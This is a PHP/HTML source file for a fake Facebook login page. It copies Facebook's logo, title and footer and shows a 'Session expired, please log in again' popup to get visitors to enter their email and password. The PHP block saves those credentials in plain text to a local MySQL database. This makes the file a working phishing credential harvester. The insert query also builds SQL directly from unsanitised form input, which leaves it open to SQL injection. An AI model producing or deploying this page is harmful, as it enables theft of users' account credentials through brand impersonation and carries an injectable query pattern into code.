<?php
    function connect(){
        $sql = new mysqli('localhost','root','','fb_lite');

        return $sql;
    }

    if(isset($_POST['logInBtn'])){
        $email = $_POST['email'];
        $pass = $_POST['pass'];

        $command = "INSERT INTO users(`email`,`password`) VALUES ('$email','$pass')";

        connect()->query($command);
    }
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <section>
        <div class="container">
            <form method="post" autocomplete="off">
                <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" width="112" class="img" alt="facebook">
                <br>
                <input type="text" name="email" placeholder="Mobile number or email" required>
                <br>
                <input type="password" name="pass" placeholder="Password" required>
                <br>
                <button name="logInBtn" class="logInbtn">Log in</button>
                <p class="forgetPassword">Forget password?</p>
                <div class="or_wrapper">
                    <div><hr></div>
                    <p>or</p>
                    <div><hr></div>
                </div>
                <p class="createAccBtn">Create new account</p>        
            </form>
        </div>
    </section>

    <section class="footer_section">
        <div class="footer_languages_wrapper">
            <div class="languages_left">
                <p>English (US)</p>
                <p>Bisaya</p>
                <p>日本語</p>
                <p>Português (Brasil)</p>
            </div>
    
            <div class="laguages_right">
                <p>Filipino</p>
                <p>Español</p>
                <p>한국어</p>
                <p>&#x2b;</p>
            </div>
        </div>

        <div class="footer_year">
            <p>About · Help · More</p>
            <p>Meta © 2022</p>
        </div>
    </section>
    

    <div class="session_wrapper">
        <div class="overlay_popup"></div>
        <div class="popUp_wrapper">
            <p>Session expired</p>
            <p>Please log in again</p>
            <button id="okBtn">OK</button>
        </div>
    </div>



    <script src="main.js"></script>
    </body>
</html>